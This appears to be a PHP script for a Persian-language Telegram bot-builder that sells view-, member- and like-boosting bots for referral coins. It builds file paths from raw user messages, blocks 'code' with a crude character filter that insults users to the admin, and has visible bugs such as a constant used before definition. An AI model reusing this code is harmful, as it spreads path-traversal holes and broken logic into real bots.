<?php
//==================================================\\
ob_start();
$load = sys_getloadavg();
$telegram_ip_ranges = [['lower' => '149.154.160.0', 'upper' => '149.154.175.255'],['lower' => '91.108.4.0',    'upper' => '91.108.7.255']];
$ip_dec = (float) sprintf("%u", ip2long($_SERVER['REMOTE_ADDR']));
$ok=false;
foreach ($telegram_ip_ranges as $telegram_ip_range) if (!$ok) {
$lower_dec = (float) sprintf("%u", ip2long($telegram_ip_range['lower']));
$upper_dec = (float) sprintf("%u", ip2long($telegram_ip_range['upper']));
if ($ip_dec >= $lower_dec and $ip_dec <= $upper_dec) $ok=true;}
if (!$ok) die();
//==================================================\\
error_reporting(0);
ini_set( "log_errors","Off" );
//==================================================\\
date_default_timezone_set('Asia/Tehran');
//==================================================\\
$token = API_KEY; 
define('API_KEY',"[TOKEN]"); // توکن ربات
$tokentext = "0000000000000"; #توکن ربات اصلی
$Dev = [ADMIN]; // ایدی عددی ادمین 
$channel = "[CHANNEL]"; // ایدی کانال بدون @
$suporttt = "[SUPPORT]";
$channel_log = "-100[IDCHANNEL]";
$namebot = "[NAMEBOT]";
$bot = "[USER]"; // ایدی ربات بدون @
$folder = "https://domain.ir/bot/bot/[BOT]"; // ادرس دامین + اسم پوشه
//==================================================\\
$robotwan = 60; // ساخت ربات بیشتر
//==================================================\\
mkdir('dataPaMicK');
mkdir('dataPaMicK/bot');
mkdir('PaMicKCreaT');
mkdir('admin');
mkdir('admin/code');
mkdir('admin/coins');
mkdir('admin/coin');
include("Time.php");
if(!is_dir('databaceBot')){
mkdir('databaceBot');
}
//==================================================\\
function bot($method,$dataPaMicKs=[]){
 $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$dataPaMicKs);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}function SendMessage($chat_id, $text){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$text,
'parse_mode'=>'MarkDown']);
}
function save($filename, $dataPaMicK){
$file = fopen($filename, 'w');
fwrite($file, $dataPaMicK);
fclose($file);
}
function SendDocument($chat_id, $document, $caption = null){
bot('SendDocument',[
'chat_id'=>$chat_id,
'document'=>$document,
'caption'=>$caption
]);
}

function EditMessageText($chat_id,$message_id,$text,$parse_mode,$disable_web_page_preview,$keyboard){
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>$text,
'parse_mode'=>$parse_mode,
'disable_web_page_preview'=>$disable_web_page_preview,
'reply_markup'=>$keyboard
]);
 }
function SendPhoto($chat_id, $photo, $caption = null){
bot('SendPhoto',[
'chat_id'=>$chat_id,
'photo'=>$photo,
'caption'=>$caption
]);
}
function sendAction($chat_id, $action){
bot('sendChataction',[
'chat_id'=>$chat_id,
'action'=>$action
]);
}
function deleteFolder($path){
if(is_dir($path) === true){
$files = array_diff(scandir($path), array('.', '..'));
foreach ($files as $file)
deleteFolder(realpath($path) . '/' . $file);
return rmdir($path);
}else if (is_file($path) === true)
return unlink($path);
return false;
} 
function Forward($kojashe, $azkoja, $kodommsg){
bot('forwardmessage',[
'chat_id'=>$kojashe,
'from_chat_id'=>$azkoja,
'message_id'=>$kodommsg
]);
}
function LeaveChat($chat_id){
bot('LeaveChat',[
'chat_id'=>$chat_id
]);
}
function GetChat($chat_id){
bot('GetChat',[
'chat_id'=>$chat_id
]);
}
//==================================================\\
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $update->message->chat->id;
$from_id = $update->message->from->id;
$message_id = $update->message->message_id;
mkdir("dataPaMicK/$from_id");
$text1 = $update->message->text;
$text = $update->message->text;
$text4 = $message->text->chat->id;
$text3 = $update->message->text;
$tc = $update->message->chat->type;
$first_name = $update->message->from->first_name;
$bloxk = file_get_contents("dataPaMicK/$from_id/bloxklist.txt");
if(strpos($text,"$") !== false or strpos($text,"'") !== false or strpos($text,'"') !== false or strpos($text,"}") !== false or strpos($text,"{") !== false or strpos($text,")'") !== false or strpos($text,"(") !== false or strpos($text,",") !== false){ 
//==================================================\\
$time = time() + 120;
$spam_status = ["time $time"];
file_put_contents("dataPaMicK/spam/$chat_id.json",json_encode($spam_status,true));
if($bloxk !== "ok"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
 $from_id از حروف ممنوعه استفاده کردید ⛔️
به مدت 1 دقیقه مسدود شدید !
گزارش کار شما به مدیر ارسال شد ❗️
",
'parse_mode'=>"HTML",
'reply_to_message_id'=>$message_id,
]); 
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"🚨رئیس این عمه خراب به ربات کد داد و بلاک شد 👇
[$from_id](tg://user?id=$from_id)
کد مورد نظر:
(`$text`)",
'parse_mode'=>"MarkDown",
]);
exit;
}
exit;
}
//==================================================\\
$last_name = $update->message->from->last_name;
$username = $update->message->from->username;
$username = $message->from->username;
$reply = $update->message->reply_to_message;
$textmassage = $message->text;
$rt = $update->message->reply_to_message;
//==================================================\\
$phone_id = $update->message->contact->user_id;
$contactnum = $update->message->contact->phone_number;
$contact = $message->contact;
$phon = file_get_contents("dataPaMicK/$from_id/phone.txt");
$phu = file_get_contents("dataPaMicK/$from_id/phonr.txt");
//==================================================\\
  $fromid = $update->callback_query->from->id;
$chatid = $update->callback_query->message->chat->id;
$callback_query = $update->callback_query;
$dataPaMicK = $update->callback_query->dataPaMicK;
$inline_query = $update->inline_query;
$query_id = $inline_query->id;
$message_id2 = $update->callback_query->message->message_id;
//==================================================\\
$user_json = json_decode(file_get_contents("dataPaMicK/$from_id/userinfo.json"));
$isblock = $user_json->isblock;
$crons = $user_json->crons;
$LinkToCron = $user_json->LinkToCron;
$foll = file_get_contents("dataPaMicK/$from_id/foll.txt");
//==================================================\\
$uplodbot = file_get_contents("admin/uplod5.txt");
$botvipcrys = file_get_contents("admin/botvipcrys.txt");
//==================================================\\
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
$trons = file_get_contents("admin/trons.txt");
$kolltron = file_get_contents("admin/kooltrons.txt");
$witrons = file_get_contents("admin/witrons.txt");
$wait = file_get_contents("dataPaMicK/$from_id/wait.txt");
$wiw = file_get_contents("dataPaMicK/$from_id/wiw.txt");
$allcoin = file_get_contents("dataPaMicK/$from_id/allcoin.txt");
@$onof = file_get_contents("dataPaMicK/onof.txt");
@$list = file_get_contents("users.txt");
@$sea = file_get_contents("dataPaMicK/$from_id/membrs.txt");
$step = file_get_contents("dataPaMicK/$from_id/step.txt");
$state = file_get_contents("dataPaMicK/$from_id/state.txt");
$state1 = file_get_contents("dataPaMicK/state1.txt");
$matn = file_get_contents("dataPaMicK/$from_id/matn.txt");
$Members = file_get_contents("dataPaMicK/Member.txt");
$rooz = jdate('j');
$mah = jdate('n');
$sal = jdate('y');
$ambar = "$sal/$mah/$rooz";
$type = file_get_contents("dataPaMicK/$from_id/type.txt");
$Viph = file_get_contents("dataPaMicK/$from_id/Viph.txt");
$meti = file_get_contents("dataPaMicK/$from_id/meti.txt");
$zaman = file_get_contents("dataPaMicK/$from_id/zaman.txt");
$bta = file_get_contents("dataPaMicK/$from_id/bta.txt");
$url =  file_get_contents("dataPaMicK/$from_id/url.txt");
$flist =  file_get_contents("dataPaMicK/$from_id/flist.txt");
$addres =  file_get_contents("dataPaMicK/$from_id/addres.txt");
$blocklist = file_get_contents("dataPaMicK/$from_id/blocklist.txt");
$nfile =  file_get_contents("dataPaMicK/$from_id/namefile.txt");
$fcode =  file_get_contents("dataPaMicK/$from_id/fcode.txt");
$fup =  file_get_contents("dataPaMicK/$from_id/fup.txt");
//==================================================\\
$step1 = file_get_contents("dataPaMicK/$from_id/step1.txt");
//==================================================\\
$join = file_get_contents("dataPaMicK/$from_id/join.txt");
//==================================================\\
$ali = file_get_contents("dataPaMicK/$from_id/ali.txt");
$to =  file_get_contents("dataPaMicK/$from_id/token.txt");
$zom =  file_get_contents("dataPaMicK/$from_id/url.txt");
$CristalCreate = file_get_contents("dataPaMicK/$from_id/CristalCreate.txt");
$CristalCreate1 = file_get_contents("dataPaMicK/$from_id/CristalCreate1.txt");
$joinej = file_get_contents("dataPaMicK/joinej.txt");
if($joinej == null ){
file_put_contents("dataPaMicK/joinej.txt","OFF");
}
//==================================================\\
$forchannel = bot ('getChatMember', ['chat_id' => "@$channel", 'user_id' => $from_id ]) ;
$tch = $forchannel->result->status;
//==================================================\\
$menu = json_encode(['keyboard'=>[
[['text'=>"⚒ ساخت ربات"]],
[['text'=>"⛔️ حذف ربات"],['text'=>"♻️ آپدیت ربات"],['text'=>"🤖 ربات من"]],
[['text'=>"🎀 بخش سرگرمی"],['text'=>"👨🏼‍💼 حساب کاربری"]],
[['text'=>"📚"],['text'=>"👔"],['text'=>"📊"],['text'=>"🎁"],['text'=>"☎️"]],
],'resize_keyboard'=>true]);
//==================================================\\
$metiwolf = file_get_contents("dataPaMicK/$from_id/metiwolf.txt");
$file=file_get_contents("dataPaMicK/$from_id/file.txt");
$account =file_get_contents("dataPaMicK/$from_id/account.txt");
$command = file_get_contents("dataPaMicK/$chat_id/com.txt");
@$amir = file_get_contents("dataPaMicK/$chat_id/amir.txt");
$fasl = jdate('f');
$month_name= jdate('F');
$day_name= jdate('l');
$tarikh = jdate('y/n/j');
$hour = jdate('H:i:s - a');
$animal = jdate('q');
$year = file_get_contents("https://api.codebazan.ir/new-year/");
$yesas = json_decode($year,true);
$day = $yesas["day"];
$hourss = $yesas["hour"];
$min = $yesas["min"];
$sec = $yesas["sec"];
@$list = file_get_contents("users.txt");
@$user = json_decode(file_get_contents("dataPaMicK/$from_id/$from_id.json"),true);
@$user1 = json_decode(file_get_contents("dataPaMicK/$from_id/$from_id.json"),true);
@$sea = file_get_contents("dataPaMicK/$from_id/membrs.txt");
@$createclicker = file_get_contents("user/$chat_id/createclicker.txt");
@$tokenhelper = file_get_contents("dataPaMicK/$chat_id/tokenhelper.txt");
@$botss = file_get_contents("dataPaMicK/$from_id/botss.txt");
@$botssvip = file_get_contents("dataPaMicK/$from_id/botssvip.txt");
$r10 = ["🔴","🟠","🟡","🟢","🔵","🟣","⚫️","🟤","⚪️"];
$a1 = $r10[rand(0, count($r10)-1)];
//==================================================\\
@$idadmin = file_get_contents("dataPaMicK/$chat_id/idadmin.txt");
@$channelmem = file_get_contents("dataPaMicK/$chat_id/channelmem.txt");
$members = file_get_contents('Member.txt');
$memlist = explode("\n", $members);
$member = file_get_contents("dataPaMicK/$from_id/member.txt");
$metiwolf = file_get_contents("dataPaMicK/$from_id/metiwolf.txt");
$mybots = file_get_contents("databaceBot/$from_id.txt");
$man = file_get_contents("dataPaMicK/$from_id/man.txt");
$blocklist = file_get_contents("dataPaMicK/blocklist.txt");
$tc = $update->message->chat->type;
$da = $update->message->reply_to_message->forward_from->id;
$forward_chat_username = $update->message->forward_from_chat->username;
$created = file_get_contents("dataPaMicK/$from_id/create.txt");
$createdvip = file_get_contents("dataPaMicK/$from_id/createdvip.txt");
$createdt = file_get_contents("dataPaMicK/$from_id/createt.txt");
$phone = file_get_contents("dataPaMicK/$text/bots.txt");
$Bots = file_get_contents("dataPaMicK/bots.txt");
$user_bots = file_get_contents("dataPaMicK/$from_id/bots.txt");
$my_id = file_get_contents("PaMicKCreaT/$text/dataPaMicK/my_id.txt");
$time = jdate("H:i:s");
$timenow = time("h:i:s");
$timenow = time();
$emtiaz = file_get_contents("dataPaMicK/$from_id/emtiaz.txt");
$lasttime = file_get_contents("dataPaMicK/$from_id/time.txt");
$warn = file_get_contents("dataPaMicK/$from_id/warn.txt");
$tests = file_get_contents("dataPaMicK/$from_id/tests.txt");
$testu = file_get_contents("dataPaMicK/$from_id/testu.txt");
$emtiaz = file_get_contents("dataPaMicK/$from_id/coin.txt");
$remove = json_encode(['KeyboardRemove'=>[],'remove_keyboard'=>true]);
//==================================================\\
if(file_exists("admin/admin1.json")){
$admin = file_get_contents("admin/admin1.json");
}else{
$admin = "تنظیم نشده است ! 💢";
}
//==================================================\\  
if(file_exists("admin/admin2.json")){
$admin2 = file_get_contents("admin/admin2.json");
}else{
$admin2 = "تنظیم نشده است ! 💢";
}
if(file_exists("admin/sponserr.json")){
$sponserr = file_get_contents("admin/sponserr.json");
$sponserr = str_replace('NAME',$first_name,$sponserr);
$sponserr = str_replace('ID',$from_id,$sponserr);
}else{
$sponserr = "متن اسپانسر تنظیم نشده است ! 🤖";
}


if(file_exists("admin/linkzirmajooo.json")){
$linkzirmajooo = file_get_contents("admin/linkzirmajooo.json");
}else{
$linkzirmajooo = "https://t.me/shampoo_sehat/1619";
}


if(file_exists("admin/linkesponser.json")){
$linkesponser = file_get_contents("admin/linkesponser.json");
}else{
$linkesponser = "https://t.me/shampoo_sehat/1619";
}
//==================================================\\
if(file_exists("admin/textstarttt.json")){
$textstarttt = file_get_contents("admin/textstarttt.json");
$textstarttt = str_replace('NAME',$first_name,$textstarttt);
$textstarttt = str_replace('ID',$from_id,$textstarttt);
}else{
$textstarttt = "متن استارت تنظیم نشده است ! 📝";
}
if(file_exists("admin/textbanerrr.json")){
$textbanerrr = file_get_contents("admin/textbanerrr.json");
$textbanerrr = str_replace('NAME',$first_name,$textbanerrr);
$textbanerrr = str_replace('ID',$from_id,$textbanerrr);
}else{
$textbanerrr = "متن زیرمجموعه گیری تنظیم نشده است ! 👤";
}
//==================================================\\  
if(file_exists("admin/buuuyyycoinn.json")){
$buuuyyycoinn = file_get_contents("admin/buuuyyycoinn.json");
$buuuyyycoinn = str_replace('NAME',$first_name,$buuuyyycoinn);
$buuuyyycoinn = str_replace('ID',$from_id,$buuuyyycoinn);
}else{
$buuuyyycoinn = "متن خرید سکه تنظیم نشده است ! 🛍";
}
//==================================================\\  
if(file_exists("admin/textback.json")){
$textback = file_get_contents("admin/textback.json");
$textback = str_replace('NAME',$first_name,$textback);
$textback = str_replace('ID',$from_id,$textback);
}else{
$textback = "متن برگشت تنظیم نشده است ! 🔙";
}
//==================================================\\
if(file_exists("admin/texttokeen.json")){
$texttokeen = file_get_contents("admin/texttokeen.json");
$texttokeen = str_replace('NAME',$first_name,$texttokeen);
$texttokeen = str_replace('ID',$from_id,$texttokeen);
}else{
$texttokeen = "متن دریافت توکن تنظیم نشده است ! 🎗";
}
//==================================================\\  
if(file_exists("admin/khamoshiii.json")){
$khamoshiii = file_get_contents("admin/khamoshiii.json");
$khamoshiii = str_replace('NAME',$first_name,$khamoshiii);
$khamoshiii = str_replace('ID',$from_id,$khamoshiii);
}else{
$khamoshiii = "متن خاموشی ربات تنظیم نشده است ! ⛔";
}
//==================================================\\  
if(file_exists("admin/emtiazzzirmod.json")){
$emtiazzzirmod = file_get_contents("admin/emtiazzzirmod.json");
}else{
$emtiazzzirmod = "1";
}
//==================================================\\  
if(strpos($blocklist, "$chat_id") !== false){
exit;
}else{
function Spam($user_id){
@mkdir("dataPaMicK/spam");
$spam_status = json_decode(file_get_contents("dataPaMicK/spam/$user_id.json"),true);
if($spam_status != null){
if(mb_strpos($spam_status[0],"time") !== false){
if(str_replace("time ",null,$spam_status[0]) >= time())
exit(false);
else
$spam_status = [1,time()+2];
}
elseif(time() < $spam_status[1]){
if($spam_status[0]+1 > 3){
$time = time() + 10;
$spam_status = ["time $time"];
file_put_contents("dataPaMicK/spam/$user_id.json",json_encode($spam_status,true));
bot('SendMessage',[
'chat_id'=>$user_id,
'text'=>"⚠️ جهت جلوگیری از اسپم شما به مدت 10 ثانیه از رباتساز بلاک شدید ❗️"
]);
exit(false);
}else{
$spam_status = [$spam_status[0]+1,$spam_status[1]];
}}else{
$spam_status = [1,time()+2];
}}else{
$spam_status = [1,time()+2];
}
file_put_contents("dataPaMicK/spam/$user_id.json",json_encode($spam_status,true));
}
}
Spam($from_id);
if($onof == "off" && $from_id != $Dev){bot('sendmessage',['chat_id'=>$chat_id,'text'=>"$khamoshiii",'message_id'=>$message_id,'reply_markup'=>json_encode(['remove_keyboard'=>true,])]);exit;}
//==================================================\\
if($text1=="/start"){
file_put_contents("dataPaMicK/$from_id/state.txt","none"); 
file_put_contents("dataPaMicK/$chat_id/bta.txt", "$ambar");
file_put_contents("dataPaMicK/$chat_id/zaman.txt", "$time");
$user = file_get_contents('users.txt');
$members = explode("\n", $user);
if(!in_array($from_id, $members)){
$add_user = file_get_contents('users.txt');
$add_user .= $from_id . "\n";
file_put_contents("dataPaMicK/$chat_id/membrs.txt", "0");
file_put_contents("dataPaMicK/$chat_id/warn.txt", "0");
file_put_contents("dataPaMicK/$chat_id/coin.txt", "2");
file_put_contents("dataPaMicK/$chat_id/type.txt", "Free");
file_put_contents('users.txt', $add_user);
}
file_put_contents("dataPaMicK/$chat_id/metiwolf.txt", "no");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
$textstarttt
",
'parse_mode'=>"HTML",
'reply_markup'=>$menu,
]);
bot('sendMessage',[   
'chat_id'=>$Dev,
'text'=>"
🧜‍♂️ Fʀᴇᴅ [$first_name](tg://user?id=$chat_id) Sᴛᴀʀᴛᴇᴅ Tʜᴇ Rᴏʙᴏᴛ 

💫 id : $chat_id
",   
'parse_mode'=>'MarkDown'   
]);
}
//==================================================\\
elseif (strpos($text, '/start') !== false) {
$newid = str_replace("/start ", "", $text);
if($from_id == $newid) {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
داری اشتباه میزنی با لینک خودت نمیتونی عضو ربات شی 😑
",
]);
}
elseif (strpos($list, "$from_id") !== false){
sendMessage($chat_id,"
شما قبلا عضو ربات بودید !😕
");
}
else{
@$sho = file_get_contents("dataPaMicK/$newid/coin.txt");
$getsho = $sho + $emtiazzzirmod;
file_put_contents("dataPaMicK/$newid/coin.txt", $getsho);
@$sea = file_get_contents("dataPaMicK/$newid/membrs.txt");
$getsea = $sea + 1;
file_put_contents("dataPaMicK/$newid/membrs.txt", $getsea);
$user = file_get_contents('users.txt');
$members = explode("\n", $user);
if(!in_array($from_id, $members)){
$add_user = file_get_contents('users.txt');
$add_user .= $from_id . "\n";
@$sea = file_get_contents("dataPaMicK/$from_id/membrs.txt");
file_put_contents("dataPaMicK/$chat_id/membrs.txt", "0");
file_put_contents("dataPaMicK/$chat_id/warn.txt", "0");
file_put_contents("dataPaMicK/$chat_id/coin.txt", "2");
file_put_contents("dataPaMicK/$chat_id/type.txt", "Free");
file_put_contents('users.txt', $add_user);
}
//==================================================\\
file_put_contents("dataPaMicK/$chat_id/metiwolf.txt", "No");
sendMessage($chat_id, "
👮‍♂ برای امتیاز گرفتن دوستتان حتما در چنل ما عضو شوید.
","MarkDown","true");
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
$textstarttt
",
'parse_mode' => "HTML",
'reply_markup'=>$menu,
]);
sendMessage($newid, "[🟨 کاربر [$first_name](tg://user?id=$chat_id) با لینک اختصاصی شما به ربات پیوست و $emtiazzzirmod سکه دریافت کردید","Markdown","true");
}
}

if($tch != 'member' && $tch != 'creator' && $tch != 'administrator' and $joinej == "ON"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
سلام گلم برای استفاده از ربات ما باید عضو کانال ما بشید 🌹

کانال ما : 🤖 : @$channel
 ",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'inline_keyboard'=>[ 
[['text'=>"عضو شدم ✅",'url'=>"https://t.me/$bot?start",$newid]],
 ]
])
]);
exit;
}

//==================================================\\
elseif($text1 == "⛔️ حذف ربات"){
if($user['bots'] != null){
file_put_contents("dataPaMicK/$from_id/step.txt","delbot");
file_put_contents("dataPaMicK/$from_id/$from_id.json",json_encode($user));
foreach($user['bots'] as $key => $name){
$name = $user['bots'][$key];
$bots[] = [['text'=>"❌ $name"]];
}
$bots = json_encode(['keyboard'=> $bots ,'resize_keyboard'=>true]);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"جهت حذف ربات خود آیدی مورد نظر را انتخاب کنید❗️",
'reply_markup'=>$bots,
'reply_to_message_id'=>$message_id,
]);
}else{
SendMessage($chat_id,"شما رباتی در سرور $namebot ندارید 📛", null, $message_id);
}
}
elseif($step == "delbot" and strpos($text, "❌ ") !== false){
$botid = str_replace("❌ @", null, $text);
$botc = file_get_contents("dataPaMicK/bot/$botid/bot.txt");

if($botc == "Payam"){
$coinbs = 5;
$nameb = "پیام رسان";
}
if($botc == "uplod"){
$coinbs = 2;
$nameb = "آپلودر";
}
if($botc == "LikeSaz"){
$nameb = "لایک ساز";
$coinbs = 30;
}
if($botc == "proxy"){
$coinbs = 10;
$nameb = "پروکسی گذار";
}
if($botc == "chat"){
$coinbs = 5;
$nameb = "چت جی پی تی";
}
if($botc == "qure"){
$coinbs = 2;
$nameb = "قرعه کشی";
}
if($botc == "Sokhan"){
$coinbs = 2;
$nameb = "سخنگو - سرگرمی گروه";
}
if($botc == "zedlink"){
$coinbs = 10;
$nameb = "ضدلینک - مدیریت گروه";
}
if($botc == "ViewGir"){
$coinbs = 7;
$nameb = "ویوگیر";
}
if($botc == "SeTWebHoK"){
$coinbs = 2;
$nameb = "ست وبهوک";
}
if($botc == "MemberGir"){
$coinbs = 7;
$nameb = "ممبرگیر";
}

if(in_array("@".$botid, $user['bots'])){
DeleteFolder("PaMicKCreaT/$botid");
rmdir("PaMicKCreaT/$botid");
DeleteFolder("dataPaMicK/bot/$botid");
rmdir("dataPaMicK/bot/$botid");
$crs = $botss - 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
file_put_contents("dataPaMicK/$from_id/step.txt","none");
$search = array_search("@".$botid, $user['bots']);
unset($user['bots'][$search]);
$user['bots'] = array_values($user['bots']);
file_put_contents("dataPaMicK/$from_id/$from_id.json",json_encode($user));

$Oks = file_get_contents("dataPaMicK/$from_id/coin.txt");
$kamass = $Oks + $coinbs;
file_put_contents("dataPaMicK/$from_id/coin.txt","$kamass");

  bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🤖 - ربات $nameb با موفقیت حذف شد و مقدار $coinbs سکه دریافت کرده اید
🗂 - حالا شما میتوانید ربات جدیدی بسازید 
",   
'parse_mode'=>"html",  
'reply_markup'=>$menu,
 ]); 
  $first_name = str_replace(["<",">"], null, $first_name);
 }else{
  SendMessage($chat_id,"⚠️ هشدار : این متن مورد تایید ما نیست تکرار نکنید.", null, $message_id);
 }
}
//==================================================\\
elseif($text1 == "/newbot" or $text1 == "⚒ ساخت ربات"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
👨‍💻 کاربر گرامی [ $first_name ]  یکی از ربات ها را جهت ساخت انتخاب کنید.
",
'parse_mode'=>"MarkDown",  
'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"👾 | ضدلینک - مدیریت گروه"]],
[['text'=>"📬 | پیام رسان"],['text'=>"🤖 | چت جی پی تی"]],
[['text'=>"👁‍🗨 | ویوگیر"],['text'=>"🌐 | پروکسی گذار"]],
[['text'=>"❤️ | لایک ساز"]],
[['text'=>"🎰 | قرعه کشی‌"],['text'=>"👤 | ممبرگیر"]],
[['text'=>"🤡 | سرگرمی گروه"]],
[['text'=>"🔗 | ست وب هوک"],['text'=>"📥 | آپلودر"]],
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
'input_field_placeholder' => 'ربات بسازید :)', 
])
]); 
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
تعداد سکه مورد نظر برای ساخت ربات 💸", 
'parse_mode'=>'HTML', 
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[['text'=>"10",'callback_data'=>'prooo'],['text'=>"🔗 | ست وب هوک",'callback_data'=>'prooo']], 
[['text'=>"10",'callback_data'=>'prooo'],['text'=>"📥 | آپلودر",'callback_data'=>'prooo']], 
[['text'=>"10",'callback_data'=>'prooo'],['text'=>"🤡 | سرگرمی گروه",'callback_data'=>'prooo']], 
[['text'=>"10",'callback_data'=>'prooo'],['text'=>"🎰 | قرعه کشی‌",'callback_data'=>'prooo']], 
[['text'=>"15",'callback_data'=>'prooo'],['text'=>"📬 | پیام رسان️",'callback_data'=>'prooo']], 
[['text'=>"20",'callback_data'=>'prooo'],['text'=>"🤖 | چت جی پی تی",'callback_data'=>'prooo']], 
[['text'=>"30",'callback_data'=>'prooo'],['text'=>"👤 | ممبرگیر",'callback_data'=>'prooo']], 
[['text'=>"30",'callback_data'=>'prooo'],['text'=>"👁‍🗨 | ویوگیر",'callback_data'=>'prooo']], 
[['text'=>"35",'callback_data'=>'prooo'],['text'=>"🌐 | پروکسی گذار",'callback_data'=>'prooo']], 
[['text'=>"35",'callback_data'=>'prooo'],['text'=>"👾 | ضدلینک - مدیریت گروه",'callback_data'=>'prooo']], 
[['text'=>"50",'callback_data'=>'prooo'],['text'=>"❤️ | لایک ساز",'callback_data'=>'prooo']], 
] 
]) 
]); 
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
//==================================================\\
elseif($text1 == "🔙 | بازگشت‌"){ 
file_put_contents("dataPaMicK/$from_id/state.txt","none");
file_put_contents("dataPaMicK/$from_id/state1.txt","none");
file_put_contents("dataPaMicK/$from_id/step.txt","none");
 file_put_contents("dataPaMicK/$from_id/ali.txt","no");
file_put_contents("dataPaMicK/$from_id/token.txt","no");
file_put_contents("dataPaMicK/$from_id/url.txt","none");
file_put_contents("dataPaMicK/$from_id/roko.txt","none");
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"به منوی اصلی برگشتید 🔙", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
exit;
}

if($text1 == "👔"){ 
 $id = bot('sendphoto',[ 
 'chat_id'=>$chat_id, 
 'photo'=>$linkesponser,
 'caption'=>"
$sponserr", 
'parse_mode'=>'HTML', 
]); 
}
//==================================================\\
elseif($text1 == "🎊 | امتیاز روزانه"){
$d = file_get_contents("dataPaMicK/$from_id/date.txt");
date_default_timezone_set('Asia/Tehran');
$t = date('Y/m/d');
if($d != $t){
$x = rand(1,3);
$coin += $x;
file_put_contents("dataPaMicK/$from_id/coin.txt", $coin);
file_put_contents("dataPaMicK/$from_id/date.txt", $t);

bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
هدیه امروز شما $x سکه است🤩

موجودی جدید شما : $coin سکه ! 💸

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$suporttt 🇫🇴",'url'=>"https://t.me/$suporttt"]],
]
])
]);
} else {
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"شما سکه روزانه امروز را دریافت کرده اید.😐",'parse_mode'=>'MarkDown',
]);
}
}
//==================================================\\
elseif($text1 == "/updatebot" or $text == "♻️ آپدیت ربات"){
if($user['bots'] != null){
file_put_contents("dataPaMicK/$from_id/step.txt","buue");
file_put_contents("dataPaMicK/$from_id/$from_id.json",json_encode($user));
foreach($user['bots'] as $key => $name){
$name = $user['bots'][$key];
$bots[] = [['text'=>"♻️ $name"]];
}
$bots = json_encode(['keyboard'=> $bots,'resize_keyboard'=>true]);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"جهت آپدیت ربات خود آیدی مورد نظر را انتخاب کنید 🙂",
'reply_markup'=>$bots,
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"$textrobotnot",
]);
}
}
//==================================================\\
if($step == "buue" and strpos($text, "♻️ ") !== false){
$botid = str_replace("♻️ @", null, $text);
$token = file_get_contents("dataPaMicK/bot/$botid/token.txt");
$channnel = file_get_contents("dataPaMicK/bot/$botid/channel.txt");
$botc = file_get_contents("dataPaMicK/bot/$botid/bot.txt");
if($botc == "Payam"){
$nameb = "پیام رسان";
$menub = json_encode(['keyboard'=>[
[['text'=>"♻️ آپدیت خود ربات"]],
[['text'=>"🤖 تعویض توکن ربات"],['text'=>"📣 تعویض آیدی کانال"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
}
if($botc == "likeSaz"){
$nameb = "لایک ساز";
$menub = json_encode(['keyboard'=>[
[['text'=>"♻️ آپدیت خود ربات"],['text'=>"🤖 تعویض توکن ربات"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
}
if($botc == "uplod"){
$menub = json_encode(['keyboard'=>[
[['text'=>"♻️ آپدیت خود ربات"]],
[['text'=>"🤖 تعویض توکن ربات"],['text'=>"📣 تعویض آیدی کانال"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
$nameb = "آپلودر";
}
if($botc == "proxy"){
$nameb = "پروکسی گذار";
$menub = json_encode(['keyboard'=>[
[['text'=>"🤖 تعویض توکن ربات"],['text'=>"📣 تعویض آیدی کانال"]],
[['text'=>"♻️ آپدیت خود ربات"],['text'=>"⏳ تعویض تایم ارسال"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
}
if($botc == "chat"){
$nameb = "چت جی پی تی";
$menub = json_encode(['keyboard'=>[
[['text'=>"♻️ آپدیت خود ربات"],['text'=>"🤖 تعویض توکن ربات"]],
[['text'=>"🔙 | بازگشت‌"]], 
],'resize_keyboard'=>true]);
}
if($botc == "qure"){
$nameb = "قرعه کشی";
$menub = json_encode(['keyboard'=>[
